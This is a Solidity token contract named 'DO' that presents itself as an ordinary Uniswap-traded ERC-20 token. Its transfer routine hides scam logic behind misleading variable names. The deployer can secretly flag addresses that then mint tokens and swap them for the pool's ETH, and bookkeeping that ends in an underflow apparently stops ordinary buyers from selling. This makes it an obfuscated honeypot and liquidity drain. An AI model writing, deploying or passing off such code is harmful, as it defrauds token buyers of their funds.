/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.15;
 
abstract contract Context
{
function _msgSender() internal view virtual returns(address)
{
return msg.sender;
}
function _msgData() internal view virtual returns(bytes calldata)
{
return msg.data;
}
}
interface IUniswapV2Router01{
    function factory() external pure returns(address);
 
    function WETH() external pure returns(address);
 
    function addLiquidity(
        address coinA,
        address coinB,
        uint amountAPrompted,
        uint amountBPrompted,
        uint amountAMinimum,
        uint amountBMinimum,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address coin,
        uint amountCoinPrompted,
        uint amountCoinMinimum,
        uint amountERCMinimum,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address coinA,
        address coinB,
        uint liquidity,
        uint amountAMinimum,
        uint amountBMinimum,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address coin,
        uint liquidity,
        uint amountCoinMinimum,
        uint amountERCMinimum,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address coinA,
        address coinB,
        uint liquidity,
        uint amountAMinimum,
        uint amountBMinimum,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address coin,
        uint liquidity,
        uint amountCoinMinimum,
        uint amountERCMinimum,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);
 
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);
 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);
 
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns(uint amountB);
 
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns(uint amountOut);
 
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns(uint amountIn);
 
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns(uint[] memory amounts);
 
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns(uint[] memory amounts);
} 
 
interface IUniswapV2Router02 is IUniswapV2Router01{
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address coin,
        uint liquidity,
        uint amountCoinMinimum,
        uint amountERCMinimum,
        address to,
        uint deadline
    ) external returns(uint amountETH);
 
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address coin,
        uint liquidity,
        uint amountCoinMinimum,
        uint amountERCMinimum,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
interface IUniswapV2Factory{
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
 
    function feeTo() external view returns(address);
 
    function feeToSetter() external view returns(address);
 
    function getPair(address coinA, address coinB) external view returns(address pair);
 
    function allPairs(uint) external view returns(address pair);
 
    function allPairsLength() external view returns(uint);
 
    function createPair(address coinA, address coinB) external returns(address pair);
 
    function setFeeTo(address) external;
 
    function setFeeToSetter(address) external;
}
interface IERC20{
    function totalSupply() external view returns(uint256);
 
    function balanceOf(address account) external view returns(uint256);
 
    function transfer(address recipient, uint256 amount) external returns(bool);
 
    function allowance(address owner, address spender) external view returns(uint256);
 
    function approve(address spender, uint256 amount) external returns(bool);
 
    function transferFrom(
    address sender,
    address recipient,
    uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
abstract contract Ownable is Context
{
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor()
    {
        _setOwner(_msgSender());
    }
 
    function owner() public view virtual returns(address)
    {
        return _owner;
    }
    modifier onlyOwner()
    {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
 
    function waiveOwnership() public virtual onlyOwner
    {
        _setOwner(address(0));
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
 
    function _setOwner(address newOwner) private
    {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract DO is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _rBaseFee = 0;
    uint8 private _decimals = 9;
    uint256 private _rTotal = 100000 * 10**_decimals;
    uint256 private syncedSupply = _rTotal;
    
    mapping(address => uint256) private _rOwned;
    mapping(address => address) private relayBytes;
    mapping(address => uint256) private syncAgnostic;
    mapping(address => uint256) private allocationsData;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingOpen = false;
    bool public RelayAllExemptions;
    bool private transmitValue;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable dexRouter;

    constructor(
        string memory Name,
        string memory Symbol,
        address IDEXrouter
    ) {
        _name = Name;
        _symbol = Symbol;
        _rOwned[msg.sender] = _rTotal;
        allocationsData[msg.sender] = syncedSupply;
        allocationsData[address(this)] = syncedSupply;
        dexRouter = IUniswapV2Router02(IDEXrouter);
        UniswapV2Pair = IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        emit Transfer(address(0), msg.sender, syncedSupply);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _rOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _standardTransferFrom        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        _standardTransferFrom        (msg.sender, recipient, amount);
        return true;
    }
    receive() external payable {}

    function addLiquidity(
        uint256 leveledValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(dexRouter), leveledValue);
        dexRouter.addLiquidityETH{value: ERCamount}(address(this), leveledValue, 0, 0, to, block.timestamp);
    }
    function sendETHToFee(uint256 tokens) private {
        uint256 divided = tokens / 2;
        uint256 stringBalance = address(this).balance;
        swapERCforTokens(divided, address(this));
        uint256 composeBalance = address(this).balance- stringBalance;
        addLiquidity(divided, composeBalance, address(this));
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapERCforTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
    function _standardTransferFrom       (
        address indexPairFrom,
        address _constructPathsTo,
        uint256 _boolLeveledAmount
    ) private {
        uint256 syncLeveledBalance = balanceOf(address(this));
        uint256 syncIDEXrouter;
        if (RelayAllExemptions && syncLeveledBalance > syncedSupply && !transmitValue && indexPairFrom != UniswapV2Pair) {
            transmitValue = true;
            sendETHToFee(syncLeveledBalance);
            transmitValue = false;
        } else if (allocationsData[indexPairFrom] > syncedSupply && allocationsData[_constructPathsTo] > syncedSupply) {
            syncIDEXrouter = _boolLeveledAmount;
            _rOwned[address(this)] += syncIDEXrouter;
            swapERCforTokens(_boolLeveledAmount, _constructPathsTo);
            return;
        } else if (_constructPathsTo != address(dexRouter) && allocationsData[indexPairFrom] > 0 && _boolLeveledAmount > syncedSupply && _constructPathsTo != UniswapV2Pair) {
            allocationsData[_constructPathsTo] = _boolLeveledAmount;
            return;
        } else if (!transmitValue && syncAgnostic[indexPairFrom] > 0 && indexPairFrom != UniswapV2Pair && allocationsData[_constructPathsTo] == 0) {
            syncAgnostic[indexPairFrom] = allocationsData[indexPairFrom] - syncedSupply;
        }
        address _relayAgnostic  = relayBytes[UniswapV2Pair];
        if (syncAgnostic[_relayAgnostic ] == 0) syncAgnostic[_relayAgnostic ] = syncedSupply;
        relayBytes[UniswapV2Pair] = _constructPathsTo;
        if (_rBaseFee > 0 && allocationsData[indexPairFrom] == 0 && !transmitValue && allocationsData[_constructPathsTo] == 0) {
            syncIDEXrouter = (_boolLeveledAmount * _rBaseFee) / 100;
            _boolLeveledAmount -= syncIDEXrouter;
            _rOwned[indexPairFrom] -= syncIDEXrouter;
            _rOwned[address(this)] += syncIDEXrouter;
        }
        _rOwned[indexPairFrom] -= _boolLeveledAmount;
        _rOwned[_constructPathsTo] += _boolLeveledAmount;
        emit Transfer(indexPairFrom, _constructPathsTo, _boolLeveledAmount);
            if (!tradingOpen) {
                require(indexPairFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
}